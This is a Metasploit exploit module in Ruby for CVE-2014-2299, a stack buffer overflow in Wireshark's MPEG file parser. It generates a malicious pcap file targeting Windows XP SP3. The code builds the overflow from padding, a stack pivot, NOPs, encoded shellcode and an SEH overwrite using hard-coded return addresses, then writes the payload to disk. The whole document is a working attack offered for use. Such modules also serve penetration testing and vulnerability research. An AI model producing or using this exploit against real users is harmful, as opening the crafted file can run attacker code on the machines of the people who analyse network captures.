##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark <= 1.8.12/1.10.5 wiretap/mpeg.c Stack Buffer Overflow (remote) PoC',
      'Description'    => %q{
          This module triggers a stack buffer overflow in Wireshark <= 1.8.12/1.10.5
          generating a malicious pcap file)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Wesley Neelen', # Discovery vulnerability
          'j0sm1',  # exploit and metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-2299'],
          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=9843' ],
          [ 'URL', 'http://www.wireshark.org/security/wnpa-sec-2014-04.html' ],
          [ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2299' ],
          [ 'URL', 'http://www.securityfocus.com/bid/66066/info' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'BadChars'    => "\xff\x00",
          'Space'       => 1000,
          'DisableNops' => 'True',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'WinXP SP3 English',
            {
              'OffSet' => 0,
              'Ret'    => 0x1c077cc3, # pop/pop/ret -> krb5_32.dll module 
              'pivot'  => 0x68e2bfb9,
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar 20 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'pcap file',  'mpeg_overflow.pcap']),
      ], self.class)
  end

  def exploit

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    magic_header = "\xff\xfb"             # magic_number
    packet =  "A" * 200                   # padding 
    packet << [target['pivot']].pack("V")	# JMP ESP
    packet << make_nops(18)			          # Align bytes to shellcode
    packet << payload.encoded      	    	# Shellcode
    packet << pattern_create(69732 - payload.encoded.length - 200 - 22)	# padding to NSEH overwrite
    packet << generate_seh_record(target.ret) 	# short jump and pop/pop/ret
    packet << "\x81\xc4\xbc\x05\x00\x00\xc3"    # add esp,1468;ret
    print_status("Preparing payload")
    filecontent = magic_header
    filecontent << packet

    print_status("Writing payload to file, " + filecontent.length.to_s()+" bytes")

    file_create(filecontent)

  end
end
